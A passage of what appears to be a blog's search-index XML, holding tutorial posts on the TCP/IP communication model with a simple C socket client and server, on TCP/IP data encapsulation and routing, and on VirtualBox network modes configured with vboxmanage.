11 after, reply [ACK: 14], reply period of DATA loss in the network, the same as the last time, timing starts when the client sends a DATA, after a certain period of time, the client didn’t receive the service side of this piece of DATA confirmation reply, the client to send the DATA. Flow control When the rate of sending data exceeds the processing capacity of the receiver, the receiver informs the sender to slow down the speed of sending data. This will be explained in detail when TCP sliding window mechanism is explained. Congestion control This section will be explained in detail in the TCP congestion control instructions.]]></content>
      <categories>
        <category>Network</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[TCP/IP Network Communication Model]]></title>
    <url>%2F2016-01-02-tcp-comminication-model%2F</url>
    <content type="text"><![CDATA[Essentially, it’s just another way of inter process comunication(IPC) between tcp/ip network applications. The layered structure of the network protocol stack only decouples the complexity of communication in the application layer, which does not need to consider data loss, data duplication and transmission timeliness in the communication process. Such problems are solved by the transport layer, the application layer only focuses on messages and processing logic in the layer. Therefore, the general transport layer modules work in the system kernel to provide the same service for all processes in the system. The operating system encapsulates the transport layer and other underlying protocols and provides uniform access interfaces for the application layer. This article mainly describes how the TCP transport layer provides abstract services for the application layer, and attempts to implement a minimalist application layer protocol based on TCP, observing the TCP protocol from the perspective of the application layer. TCP Model TCP provides end-to-end connection service for the application layer, and full duplex communication can be achieved between the two sides. The communication data is sent and received in the form of reliable byte stream. Because UNIX systems are designed according to the everything-is-file rule, network devices are also abstracted to files, so network devices can be accessed using the common UNIX system IO. This is all that a process referring to TCP stack communication knows. As for how to ensure the reliability of data transmission, the flow control of data traffic when the network congestion happened, all these are not visible to the process. End-to-end connection TCP only supports communication between two processes in the network, and a connection needs to be established before the process can communicate. Typically, the two processes are client and server relationships. When a process sends and receives data, it simply reads and writes from a file descriptor bound to the network. For the system kernel, the file descriptor that establishes the connection is bound to a quad set {client IP, client TCP port number, server IP, server TCP port number}, which can uniquely identifie a TCP connection. Full-duplex A process that participates in communication and can send and receive data at the same time. Byte stream Communication data is a reliable byte stream, which means that process communication data is sent and received byte by byte according to the sort. Therefore, the application layer needs to complete the parsing and segmentation of application-layer messages. Sequence of communication The process implements network communication by calling the set of Socket API functions. The communication process is roughly divided into four stages: communication preparation stage, TCP connection establishment stage, data interaction stage, and TCP connection release (disconnect) stage. Preparation the client mainly calls the function socket() to apply file descriptor sockfd. If the client does not call the function bind() to bind the local TCP port number, the operating system will automatically assign a temporary port number to it. Sockfd corresponds to {client IP, client temporary TCP port number}. the server mainly calls the function socket() to apply file descriptor listenfd. The listenfd is used to receive connection requests from unknown clients. The server must call the function bind() to bind the TCP port it is listening to, which is the well-known port number of the server process. The listen() function informs the system kernel that the listenfd is only used to wait on connection requests from unknown clients. Connection establishment phase the client calls the function connect() to initiate a request to establish a connection to the server. If the TCP connection is established successfully, the file descriptor sockfd binding is a quad {server IP, server TCP port number, client IP, client temporary TCP port number}. the server side calls the function accept(), which blocks and waits for the TCP connection request of the unknown client. If accept() returns successfully, the return value is the file descriptor connectfd. The connectfd binding content is a quad {server side IP, server side TCP port number, client side IP, client side temporary TCP port number}. Data interaction phase At this point, both ends can use UNIX standard IO functions read() and write() or use Socket function family send() and recv() to send and receive data, the client read and write object is sockfd, the server read and write object is connectfd. Release When either end completes sending or receiving data, use the function shutdown() to close the “r”, “w”, or “rw” operations to the file descriptor, or use the function close() to close the “rw” operations to the file descriptor. Example The following is an implementation of the simple application layer communication protocol mentioned earlier in c. To simplify error handling in the code, the lib function in UNPv3 (“lib/unp.h”) is used. Server: a “Server” process running on host S Client: a “Client” process running on host C The content of the request message sent by the client is a string, “request,hostname” After receiving the request message, the server gets its own host name, and then replies it to the client, “response,&lt; the obtained host name &gt;”. Client 1234567891011121314151617181920212223242526272829303132333435363738#include "lib/unp.h"int main(int argc, char **argv)&#123; //一些初始化工作 int sockfd = 0; char response[MAXLINE + 1]; char request[] = "request,hostname\r\n"; struct sockaddr_in servaddr; bzero(&amp;servaddr, sizeof(servaddr)); bzero(response, MAXLINE + 1); //设置将要连接服务器进程的IP地址和TCP端口号 servaddr.sin_family = AF_INET; servaddr.sin_port = htons(1982); Inet_pton(AF_INET, argv[1], &amp;servaddr.sin_addr); //创建Socket，AF_INET表示IPv4，SOCK_STREAM表示TCP sockfd = Socket(AF_INET, SOCK_STREAM, 0); //发起连接请求, sockfd和Server进程的IP地址，TCP端口号绑定 Connect(sockfd, (SA *) &amp;servaddr, sizeof(servaddr)); //发送请求消息 Write(sockfd, (char*) request, strlen(request)); //等待从Server进程接收响应消息 Readline(sockfd, response, MAXLINE); //将结果输出到标准输出 printf("%s", response); //关闭Socket,通知服务进程通信结束 Close(sockfd); //进程结束 exit(0);&#125; Server 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include "lib/unp.h"int main(int argc, char** argv)&#123; //一些初始化工作 int listenfd = 0; //Server进程监听文件描述符 int connectfd = 0; //Server进程连接文件描述符 int length = 0; //Server进程接收到请求长度 char responsbuf[MAXLINE] = &#123; 0 &#125;; //Server响应消息缓存 char requestbuf[MAXLINE] = &#123; 0 &#125;; //Client请求消息缓存 char response_prefix[] = "response,"; //响应消息前缀 char response_suffix[] = "\r\n"; //响应消息后缀 //连接Server进程的Client进程的地址信息 struct sockaddr_in clntaddr; bzero(&amp;clntaddr, sizeof(clntaddr)); socklen_t sock_length = sizeof(struct sockaddr_in); //Server进程所在的IP地址和监听端口号1982 struct sockaddr_in servaddr; bzero(&amp;servaddr, sizeof(servaddr)); servaddr.sin_family = AF_INET; //使用IPv4，实际上也可以使用IPv6 servaddr.sin_addr.s_addr = htonl(INADDR_ANY); //监听各个网络接口 servaddr.sin_port = htons(1982); //监听端口号1982 //创建Socket，AF_INET表示IPv4，SOCK_STREAM表示TCP listenfd = Socket(AF_INET, SOCK_STREAM, 0); //将服务器的地址，端口号绑定到新创立的socket文件描述符listenfd Bind(listenfd, (SA *) &amp;servaddr, sizeof(servaddr)); //通知OS Kernel，新创建的socket文件描述符用于服务器进程 Listen(listenfd, LISTENQ); //开始处理来自Client进程的请求 while (1) &#123; //接受来自Client进程的连接请求，后两个参数保存正在发起连接请求的Client进程信息 connectfd = Accept(listenfd, (SA *) &amp;clntaddr, &amp;sock_length); //接收Client进程的消息 bzero(requestbuf, sizeof(requestbuf)); Readline(connectfd, requestbuf, sizeof(requestbuf)); printf("Receive message from client process on %s: %s\n", inet_ntoa(clntaddr.sin_addr), requestbuf); //Server进程返回响应消息给Client进程，消息格式为"response, &lt;hostname&gt;\r\n" bzero(responsbuf, sizeof(requestbuf)); strncpy(responsbuf, response_prefix, strlen(response_prefix)); gethostname(responsbuf + strlen(response_prefix), MAXLINE); strncat(responsbuf, response_suffix, strlen(response_suffix)); Write(connectfd, responsbuf, strlen(responsbuf)); //再次阻塞等待Client进程的消息，这次等到的是EOF，收到EOF后阻塞态结束，Readline返回 Readline(connectfd, requestbuf, sizeof(requestbuf)); //结束与Client进程通信 Close(connectfd); &#125; exit(0);&#125; Run Server 1234toto@ServerOS:~$ server Receive message from client process on 10.16.56.2: request,hostnameReceive message from client process on 10.16.56.2: request,hostname～阻塞等待 Client 1234toto@ClientOS:~$ client 10.22.5.3response,gurutoto@ClientOS:~$ client 10.22.5.3response,guru Reference Some more reference RFC2616，“Hypertext Transfer Protocol/1.1”和《HTTP The Definitive Guide》 RFC3117，“On the Design of Application Protocols” RFC3205，“On the use of HTTP as a Substrate” RFC5321，“Simple Mail Transfer Protocol”]]></content>
      <categories>
        <category>Network</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[TCP Data Encapsulation]]></title>
    <url>%2F2016-01-01-tcp-data-encapsulation%2F</url>
    <content type="text"><![CDATA[When computers performs network communication, it’s essentially inter-process communication across operating systems. When communicating between processes within the same operating system, the process exchanges data through pipes, FIFOs, shared memory, etc{1}. The data itself does not change. In network communication, because the operating system is spanned, the process needs to help locate the remote process by using the network layer and transport layer module provided by the operating system. This article briefly describes the data (encapsulation layer) of the interprocess communication when it interacts across the TCP/IP network protocol stack, data encapsulation, transmission and decapsulation. A Typical TCP/IP Network The two Ethernet switches form two Ethernet LAN segments (LAN A and LAN B), where the network segment LAN A is 10.22.5.0/24 and the network segment LAN B is 10.16.56.0/24. Segments are connected by a router to form an internet. Use VirtualBox and GNS3 to build this topology, involving the operating system and software, Host A in network A: Ubuntu14.04 Host B in Network B: Ubuntu 12.04 (running in Virtualbox) Router Router OS: Cisco 2600 (running on GNS3) TCP/IP protocol stacks The TCP/IP nprotocol stack is the most widely applied protocols in the network area (Figure 2). In this protocol stack, each layer corresponds to the software associated with this layer. The “application layer” represents the user process and the related protocols that it complies with. For example, when browsing a webpage using a browser, the browser process communicates with the remote web server process, both of which comply with the HTTP protocol, the browser sends the request, and the server sends back the responses. The “transport layer” represents the software modules implemented in the operating system kernel (sometimes not in OS kernel) such as TCP module, UDP module and the protocols it complies with. The transport layer provides services for the upper layer. For example, the application layer needs data not to be lost during transmission, and not duplicated, the application layer needs to reference the TCP protocol to send and receive data. The “network layer” is used to find the destination host for the packets and route the data to the destination host. The “data link layer” performs the actual transceiving operation of the data. Data encapsulation is performed in this protocol stack structure. (In fact, the implementation of the transport layer is not necessarily limited to the system kernel. At present, most operating system implementations implement the transport layer protocol in the kernel.) Data from user processes, application layer messages The application layer protocol is the protocol used for interprocess communication in the internetwork. It is mainly used for two processes or multiple processes in the network to send data back and forth. The data sent at this layer, we call them messages, the message sent between processes, generated by the process developer according to the application layer protocol it refers to, such as HTTP messages, LDAP messages, etc. In order to clearly explain the problem, we temporarily set aside complex and existing application layer protocols to design a minimalist new application layer protocol. The protocol is as follows: In an internet. Server：Server process running on host S. CLient: Client process running on host C. Client sends a string “request,hostname”, which is ask for the hostname of the server. After the server receives the message, the server get the hostname of itself, and response a string “response, [the real hostname]”。 According to the actual situation of modern multi-task operating system, this process can be shown as follows: In TCP/IP networks, the process Client provides the Client OS with information about the process Server (IP address, TCP service port number). Process Server also notifies its operating system, Server OS, on which TCP port it is listening for connection requests. The above content is what application developers and application layer protocol stakeholders (such as network technical support, black hat, white hat packet analysis, etc.) need to pay attention to. Encapsulation of application-layer messages in Tranport Layer The request message “request,hostname” initiated by the process “Client” will not be sent to the receiver process “Server” arbitraily. It has to go through the network topology showen in figure 1 to the Server process with the help of the operating system. The details of “message” itself does not provide enough information to the client operating system to locate the remote host in the network, or even the process Server running in the remote host.Therefore, the Client process needs to provide this information to the operating system, and the operating system will append this information to the application layer message data. This process of information appending is called “data encapsulation”.In order to focus on “data encapsulation”, details such as segmentation of the transport layer will not be explained here, and these details will be specifically explained in subsequent articles. According to the TCP/IP stack structure, the application layer message “request,hostname” first comes to the TCP transport layer processing module in the OS Kernel. The TCP module append the source port to the message to identify which process of ClientOS issued the data from. This port number is temporarily assigned by the operating system. In addition, destination port added to identify the remote process which will be used by server side. This Port number is provided to the operating system kernel by the Client process. In most cases, the so-called “well-known Port” is used. Of course, the choice of Port number is not limited. Next, the TCP module adds some important additional fields to the message, that is, the part I identified as “misc”, which is some core functional data fields (such as UDP, SCTP, etc.) that distinguish TCP protocol from other transport layer protocols. At this point, the transport layer wraps up the application layer messages, and the data encapsulated by the transport layer is generally referred to as “segment”. The details of the Misc section are part of TCP’s header structure, which I won’t refer now. This is what transport layer protocol developers need to pay attention to, what services the protocol provides for the upper layer, such as ensuring that the application layer data is not lost in the transmission. Encapsulation of segment in Network Layer After TCP encapsulation, segment data arrives at the network layer. As mentioned, the main function of the network layer is host addressing and routing. The protocol of this layer is to find the remote host in the complex network. So the destination address of the remote host is mandatory, and the source address of the host of the sending end is also mandatory when the data is returned from the remote host. These are IP addresses. The IP address of the server host needs to be provided by the application layer process of client host, because only the client process knows which host the data it sends to. There is still a problem here, how to determine the source address of the client host? Most computers now have multiple network adapters that connect to multiple Homed networks simultaneously, such as WIFI module, physical network cable interface, SIM card WAN interface, VPN interface, virtual network card and so on. Each class of interface will have an IP address. Which IP address is selected as the source address? Here is the host C configuration in the topology diagram. 123456789$ ifconfigeth0 Link encap:Ethernet HWaddr 08:00:27:ff:66:a4 inet addr:10.16.56.2 Bcast:10.16.56.255 Mask:255.255.255.0lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0wlan0 Link encap:Ethernet HWaddr 84:3a:4b:1d:c0:c0 inet addr:192.168.1.104 Bcast:192.168.1.255 Mask:255.255.255.0wwan0 Link encap:Ethernet HWaddr 4a:b6:38:ec:5c:6d inet addr:10.18.150.41 Bcast:10.18.150.47 Mask:255.255.255.248 In fact, the IP processing module in the kernel needs to refer to the receiver IP address to decide which sender IP address to use. The destination of data sent by the application process Client is host S, whose IP address is 10.22.5.3. At this time, the IP processing module needs to check the local routing table to confirm which network adapter sends data, so as to further package and encapsulate the data. The kernel routing table of host C where the process Client is located is as follows, referring to the destination IP address 10.22.5.3, so the default routing needs to be selected to send data from eth0. The final source address should be eth0 network adapter address 10.16.56.2, which also explains why the host needs the routing table. 1234567$ route -nvKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface0.0.0.0 10.16.56.1 0.0.0.0 UG 0 0 0 eth010.16.56.0 0.0.0.0 255.255.255.0 U 1 0 0 eth010.18.150.40 0.0.0.0 255.255.255.248 U 5 0 0 wwan0192.168.1.0 0.0.0.0 255.255.255.0 U 9 0 0 wlan0 After the source host IP address and the destination host IP address are determined, the network layer starts encapsulating segment data from the transport layer. The segment data encapsulated by the IP layer is called IP Packet. At this point, the data is packaged in the operating system kernel phase. The packet leaves the host and enters the network IP packets can now be sent out. Just as the Courier is required to carry the package to the next station when sending the express, we also need the help of the link layer (including the physical layer) to carry the IP packet to the next router when sending the IP packet. The process by which an IP packet goes from one host containing an IP processing software module to another host containing an IP processing software module is called IP packet Hop. The IP packet hops through to its destination. The Ethernet topology in figure 1 is taken as an example. Eth0, the exit of packet sent by host C to host S is network adapter eth0, so eth0’s MAC address is added as the source MAC address. The destination MAC address of the router is obtained through ARP protocol, and the data is sent to the next hop according to the obtained MAC address. The ARP protocol is equivalent to the network adapter host C sending a broadcast in its own subnet asking, “which host IP address in the network is 10.16.56.1, please provide the MAC address to 08:00:27:ff:66:a4”. Once the MAC address is obtained, the destination MAC address is saved in the ARP cache list of the kernel and the IP packet is sent to the router. Instead of asking the destination MAC address every time using the ARP protocol, is periodically updated. After obtaining the destination MAC address, the link-layer software continues to encapsulate the data from the network layer, and the data encapsulated after the link-layer is generally called “Frame”. At this point, the frame data can be moved to the physical network card to send out. The physical network card sends this data frame in the form of high and low level through the network cable (1001010101010… ). This data frame first reaches the Switch in the network. When ARP requests the destination MAC address, the Switch has already recorded which two physical ports correspond to the source MAC address and the destination MAC address. Using optical or electrical signals from the physical layer, the switch sends this data frame to the router based on the destination MAC address. Where packets go, routers come into play After the data frame to the router, the router first remove all the link layer address information, then reads the destination IP address of the IP layer, and looks up its own routing table, to analyze which interface the network packet should go to , router repeats the processing of the link layer, according to the type of data link, again to attach the data link layer address in IP packet, before encapsulation procedure, the router also using ARP request to get the next-hop link layer MAC address, the data for the next hop. If a packet passes through more than one router, the process is the same, except that the router’s routing table is updated and the number of IP packet hops changes. The above part is the content that router manufacturers pay attention to, such as Cisco, Ericsson, Huawei, etc. Of course, there are also shameless manufacturers secretly steal user data, generally done here quietly. The packet reaches the destination host and decapsulation the link layer of the target host removes the relevant fields of the link layer and sends the data to the IP layer processing module according to the type field. the IP layer removes the network layer related fields and sends the data to the TCP processing module according to the type field. -tcp layer obtains segment data, removes the fields of this layer, and sends the application message data to the corresponding process Server according to the destination port number. finally, the Server process gets the data “request,hostname” in “figure 3”. When the service process Server gets its own host name and responds to the Client process, the Server repeats the above procedures of encapsulation, sending and decapsulation to return the data to the Client process.]]></content>
      <categories>
        <category>Network</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[VirtualBox Network Topology]]></title>
    <url>%2F2015-12-24-network-topology-in-virtualbox%2F</url>
    <content type="text"><![CDATA[VirtualBox is a powerful x86 and AMD64/Intel64 virtualization software(VBox for short), which can be used to construct kinds of debug or test network environments, to capture or analyse the packets in the test network. Sometimes, for the sake of security, some virtual hosts run parallely on the same physical platform to isolate each other, decrease complexity. Sometimes, Vbox is used as hack tools to hide from tracking. All these usages are based on the network configuration of Vbox itself. This article is about the network configurations and the topology of each configuration. As usual, we start talking about network from the Physical layer. Network Adapter VBox provide 8 PCI network adapter for each client, only 4 of them can be configured with GUI, and all 8 adapters can be configured through command line interface. Optional categaries: 123456AMD PCNet PCI II(Am79C970A)AMD PCNet FAST III(Am79C973)Intel PRO/1000 MT Desktop(82540EM)Intel PRO/1000 T Server(82543GC)Intel PRO/1000 MT Server(82545EM)Paravirtualized network adapter(virtio-net, KVM project related) Remark, all the client OS must contain the specific driver for the specific adapter.(Most of modern OS have the drivers.) Network Types VBox provides us 7 options to fullfill kinds of requirements. Option 1: Not attached With ‘Not attached’, the client machine runs as a standalone computer that has a network adapter without network cable plugging in. Option 2: Network Address Translation(NAT) ‘NAT’ is a default option when VBox is installed. VBox provides a NAT router and DHCP service for every client os. E.g. we config 3 client os at the same time, the 10.0.2.15 is assigned to all the 3 client os, the default gateway IP address is 10.0.2.2. The default segment is 10.0.2.0/24. Of course, the default information can be changed with the command: 1vboxmanage modifyvm &lt;vmname&gt; --natnet1 "192.168/16" If the host os can access the Internet，so does the client os. From the physical network point of view, all of the packets which actually come from the different client os, are all from the Vbox process. At the same time, it’s also show us that the NAT network can be recursive. Now, if any user from the physical network need to access any of the client os in VBox, port forwarding setting should be considered. Option 3: NAT Network In this mode, all of the clients on VBox share the same NAT router. It’s just like the wifi router used at home. And we must create a NAT network manually before using it. (Virtual Box &gt; Preferences &gt; Network &gt; Create) The key difference between NAT Network and NAT option is that, in the NAT Network, clients share the same router and gateway. Option 4: Bridged Networking In this mode, client and host machine are bridged in the same ethernet segment. In other words, the clients are connected to the physical network directly. If there’s a DHCP server, the clients get IP addresses automatically. Theoretically, in the bridged mode, either the clients or the VBox itself can provide the DHCP service for the network, and it highly possible result unpredictable conflicts. It’s not recommended to do this. If the host is multihomed, the network interface should be indicated specifically. 1234#The bridge interface printoutvboxmanage list bridgedifs#Bridgevboxmanage modifyvm &lt;vmname&gt; --nic&lt;X&gt; bridged --bridgeadapter&lt;X&gt; &lt;bridgedifs&gt; If the client can not get a proper ip address from DHCP server, run this on client Linux. 1dhclient eth0 -v Notice that this mode is only effective when the data-link layer is ethernet network including the cabled or the wireless. Option 5: Internal Networking In the process of developing a network application, it’s inevitable to capture the network data packets for debuging or test. Most of the time, engineers prefer the bridged mode. Sometimes it’s more useful to choose the internal network mode. For instance, if the packets will impact the physical network, we should prevent this kind of situation in product environment, or, if we need excluding the unnecessory interference packets, to simplify the analysing process. Sometimes maybe we also need an extra internal network like the topology for the nodes to communication with each other with heatbeat packets. VBox CAN provide DHCP service in this mode, here is the configuration procedure: 12345678# Check the Internal Networkvboxmanage list intnets# Modify the given nic x to Internal Networkingvboxmanage modifyvm &lt;vmname&gt; --nic&lt;x&gt; &lt;intnet&gt;# Add DHCP service for the Internal Networkvboxmanage dhcpserver add --netname &lt;network_name&gt;# Check all the DHCP servicevboxmanage list dhcpservers DHCP service can be configed on one of the client. Static IP address can also be assigned to client directly. Please notice that, under UNIX like os, VBox should run with the same login user to construct a internal network. Option 6: Host-only Networking In this mode, it’s just like the internal mode, the only difference is that the host machine is added into the internal network. In this mode, it’s optional whether the VBox provides the DHCP service or not. Configuration procedure: 12345678910# Config the given nic x of a specific vmname to Host-only modevboxmanage modifyvm &lt;vmname&gt; --nic&lt;x&gt; hostonly# Construct the network which is reserved by Host-only modevboxmanage hostonlyif create# Check the resultsvboxmanage list hostonlyifs# Client power on, on the host machine, check the new created network ififconfig# Switch on the DHCP service which is provided by VBoxvboxmanage dhcpserver add --netname &lt;network_name&gt; After DHCP Server start, sometimes, the client can’t get a proper IP address. It’s a bug of VBox (#4038). The remedy is to power off all the client machine, on the host machine, kill all the VBox processes, restart the VBox, power on all of the hosts again. Option 7 A unusual used option, please refer the document for details. The packets-capture-feature of VBox When we need to capture the packets in the network constructed in VBox, tools like tcpdump or wireshark can be applied. VBox provide another option for packets capturing. Procedure: 1234#Power off the clientsvboxmanage modifyvm [vmname] --nictrace[adapterX] on --nictracefile[adapterX] &lt;filename&gt;.pcap#Power on the clients, the packets will be captured automatically. After caturing, stop,vboxmanage modifyvm [vmname] --nictrace[adapterX] off --nictracefile[adapterX] &lt;filename&gt;.pcap The test environment referred in the artical. 123Host OS: ubuntu 14.04 LTSClient OS: ubuntu 12.04.2 LTS, ubuntu-14.04.2-serverVirtualBox: Version 4.3.0 Ubuntu R93012]]></content>
      <categories>
        <category>Network</category>
      </categories>
  </entry>
</search>
